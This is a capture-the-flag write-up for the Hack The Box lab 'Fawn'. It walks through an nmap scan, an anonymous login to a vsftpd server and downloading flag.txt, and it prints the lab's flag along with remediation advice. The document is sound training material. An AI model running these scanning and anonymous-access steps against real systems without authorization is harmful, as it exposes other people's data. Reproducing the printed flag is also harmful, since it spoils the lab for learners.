# HTB Starting Point Lab Walkthrough: Fawn (Unix Box)

## Executive Summary

- **Lab Objective**: Enumerate and exploit an FTP service on the target machine to retrieve a flag, simulating basic file transfer protocol reconnaissance.
- **Target IP**: 10.129.51.104
- **Key Findings**: Identified an FTP server (vsftpd 3.0.3) allowing anonymous login, which permitted access to a directory containing a sensitive file (`flag.txt`). No authentication was required.
- **Impact**: In a real-world scenario, anonymous FTP access could lead to unauthorized data exposure, potentially compromising sensitive information.
- **Recommendations**: Disable anonymous FTP logins, restrict access to authorized users, and regularly audit FTP configurations.
- **Completion Date**: July 3, 2025
- **Tools Used**: Nmap, ftp (on Kali Linux)

## Methodology and Scope

This walkthrough follows a standard reconnaissance and exploitation process for the HTB Starting Point lab "Fawn." The scope was limited to port scanning, FTP service enumeration, and file access on the provided target IP. No advanced exploitation or privilege escalation was required.

Steps were performed in a controlled lab environment using default Kali tools. Assumptions: Target is a Unix machine running an FTP service.

## Findings

### Finding 1: FTP Service Identification

- **Description**: FTP (File Transfer Protocol) is a protocol for transferring files over a network. It operates on port 21, with a secure variant called SFTP. A scan identified vsftpd 3.0.3 running on the target.
- **Severity**: Informational (baseline enumeration).
- **Steps to Reproduce**:
    1. Perform a targeted port scan with version detection using Nmap:
        
        ```bash
        nmap -sS -sV -p 21 10.129.51.104
        ```
        
        Output:
        
        ```bash
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-03 19:19 EDT
        Nmap scan report for 10.129.51.104
        Host is up (0.025s latency).
        PORT   STATE SERVICE VERSION
        21/tcp open  ftp     vsftpd 3.0.3
        Service Info: OS: Unix
        ```
        
- **Impact**: Confirms FTP is active and identifies the server version, enabling further enumeration.
- **Evidence**: Nmap scan results above.
- **Remediation**: N/A (informational).

### Finding 2: Anonymous FTP Login

- **Description**: The FTP server allows anonymous login with no password, granting access to the server’s file system. A successful login returns response code 230.
- **Severity**: Medium (unauthenticated access to FTP).
- **Steps to Reproduce**:
    1. Connect to the FTP server using the `anonymous` username:
        
        ```bash
        ftp 10.129.51.104
        ```
        
        Output:
        
        ```bash
        Connected to 10.129.51.104.
        220 (vsFTPd 3.0.3)
        Name (10.129.51.104:reaper): anonymous
        331 Please specify the password.
        Password: 
        230 Login successful.
        Remote system type is UNIX.
        Using binary mode to transfer files.
        ftp> 
        ```
        
- **Impact**: Unauthenticated access could allow malicious users to browse and retrieve files, risking data exposure.
- **Evidence**: FTP login output above.
- **Remediation**: Disable anonymous login in vsftpd configuration; require strong credentials for all users.

### Finding 3: File Retrieval from FTP Server

- **Description**: After logging in anonymously, enumerated directories to locate and download a sensitive file (`flag.txt`) using the `get` command. Alternative command `ls` (instead of `dir`) confirmed file presence.
- **Severity**: High (successful data exfiltration).
- **Steps to Reproduce**:
    1. List files on the FTP server:
        
        ```bash
        ftp> ls
        ```
        
        Output:
        
        ```bash
        229 Entering Extended Passive Mode (|||60252|)
        150 Here comes the directory listing.
        -rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
        226 Directory send OK.
        ```
        
    2. Download the target file:
        
        ```bash
        ftp> get flag.txt
        ```
        
        Output:
        
        ```bash
        local: flag.txt remote: flag.txt
        229 Entering Extended Passive Mode (|||34145|)
        150 Opening BINARY mode data connection for flag.txt (32 bytes).
        100% |***********************************|    32       30.54 KiB/s    00:00 ETA
        226 Transfer complete.
        32 bytes received in 00:00 (1.17 KiB/s)
        ftp> quit
        ```
        
    3. Verify locally:
        
        ```bash
        ls
        flag.txt
        cat flag.txt
        035db21c881520061c53e0536e44f815
        ```
        
- **Impact**: Demonstrates full read access to sensitive files, equivalent to a data breach in production.
- **Evidence**: Command outputs and flag value above.
- **Remediation**: Remove publicly accessible files from FTP directories; implement access controls and file permissions.

## Recommendations

- Disable anonymous FTP access in vsftpd configuration (e.g., set `anonymous_enable=NO`).
- Restrict FTP to secure protocols like SFTP to prevent unencrypted data transfers.
- Regularly scan for open FTP services and misconfigurations using tools like Nmap or ftp-anon.nse.
- For labs like this, practice enumerating FTP with tools like Metasploit’s ftp_login module for deeper analysis.

## Appendices

- **Raw Notes/Logs**: (Optional—attach full session logs if sharing.)
- **Screenshots**: (Add here if available, e.g., terminal captures.)